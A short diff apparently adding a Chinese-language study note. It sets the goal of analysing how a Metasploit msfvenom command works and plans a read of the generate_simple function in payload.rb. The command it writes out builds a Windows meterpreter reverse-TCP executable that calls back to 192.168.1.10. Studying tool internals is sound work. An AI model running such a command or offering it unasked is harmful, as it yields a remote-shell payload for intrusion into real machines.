@@ -1,0 +1,4 @@
+Goal: 分析msfvenom -p windows/meterpreter/reverse_tcp -LHOST=192.168.1.10 -f exe -o payload.exe的原理
+
+TO DO
+分析metasploit源码下的lib/msf/base/simple下的payload.rb的generate_simple函数
